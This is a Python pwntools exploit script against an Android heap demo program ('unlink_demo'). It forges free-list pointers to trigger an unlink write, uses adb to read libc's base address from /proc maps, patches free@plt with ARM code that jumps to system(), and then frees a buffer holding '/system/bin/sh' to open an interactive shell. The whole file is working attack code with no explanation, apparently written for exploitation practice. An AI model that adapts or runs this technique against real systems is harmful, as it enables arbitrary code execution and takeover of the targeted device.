#!/usr/bin/env python
# encoding=utf-8
__author__ = 'cpf'

from pwn import *


class UnlinkExp:
    def __init__(self, ip, port):
        self.remote_process = remote(ip, int(port))
        self.libc_base_addr = int(UnlinkExp.get_base_addr("/system/lib/libc.so", "./unlink_demo"), 16)
        self.system_addr = self.libc_base_addr + 0x246A1  # 0x246A1 system offset
        self.free_plt_addr = 0x8558

    def run(self):
        print "[+] step 1: Malloc two notes: 0, 1"
        self.__malloc_note(0, 4, "c" * 4)
        self.__malloc_note(1, 4, "c" * 4)

        print "[+] step 2: Fake fd, bk. Modify presize and pre inuse flag of notes[1]"
        notes_addr = int(raw_input("notes address:"), 16)
        # "c"*8 + fake_fd + fake_bk + "c"*0x70 + fake_presize + modify_pre_inuse_flag
        note0_content = "c" * 8 + p32(notes_addr - 12) + p32(notes_addr - 8) + "c" * 0x70 + p32(0x80) + p32(0x88 | 0x02)
        self.__edit_note(0, 0x88, note0_content)

        print "[+] step 3: free ntoes[1], trigger unlink"
        self.__free_note(1)

        print "[+] step 4: write free@plt address to notes[0]"
        note0_content = "c" * 12 + p32(self.free_plt_addr)
        self.__edit_note(0, 0x10, note0_content)

        # ldr R1,=system_addr
        # blx R1
        # system_addr
        print "[+] step 5: modify code of free@plt to jump to system() function"
        note0_content = p32(0xE59F1000) + p32(0xE12FFF31) + p32(self.system_addr)
        self.__edit_note(0, 0xC, note0_content)

        print "[+] step 6: malloc notes[2], initialize using /system/bin/sh, and then free notes[2] to trigger system('/system/bin/sh')"
        self.__malloc_note(2, 0xE, "/system/bin/sh")
        self.__free_note(2)

        self.remote_process.interactive()

    def __free_note(self, note_index):
        self.remote_process.recvuntil("\n")
        self.remote_process.recvuntil("\n")
        cmd = "1," + str(note_index) + "\n"
        self.remote_process.send(cmd)

    def __malloc_note(self, note_index, note_len, note_content):
        self.__change_note_content(0, note_index, note_len, note_content)

    def __edit_note(self, note_index, note_len, note_content):
        self.__change_note_content(2, note_index, note_len, note_content)

    def __change_note_content(self, cmd, note_index, note_len, note_content):
        self.remote_process.recvuntil("\n")
        self.remote_process.recvuntil("\n")
        cmd = str(cmd) + "," + str(note_index) + "\n"
        self.remote_process.send(cmd)
        self.remote_process.recvuntil("\n")  # input note len
        self.remote_process.send(str(note_len) + "\n")
        self.remote_process.recvuntil("\n")  # input note content
        self.remote_process.send(note_content + "\n")

    @staticmethod
    def run_adb(cmd):
        args = ["adb"]
        args.extend(cmd)
        adb_process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return adb_process.communicate()

    @staticmethod
    def get_process_id(process_name):
        ret = UnlinkExp.run_adb(["shell", "ps"])
        for line in ret[0].splitlines():
            line = line.strip()
            if (line.split()[-1] == process_name):
                return line.split()[1]

    @staticmethod
    def get_base_addr(module_name, process_name):
        process_id = UnlinkExp.get_process_id(process_name)
        print "[+] The process id of %s is %s" % (process_name, process_id)
        ret = UnlinkExp.run_adb(["shell", "cat", "/proc/%s/maps" % (process_id)])
        for line in ret[0].splitlines():
            line = line.strip()
            if (line.split()[-1] == module_name):
                return line.split("-")[0]


def main():
    try:
        unlink_exp = UnlinkExp("127.0.0.1", 12345)
        unlink_exp.run()
    except Exception, ex:
        print ex
        exit(0)


if __name__ == "__main__":
    main()
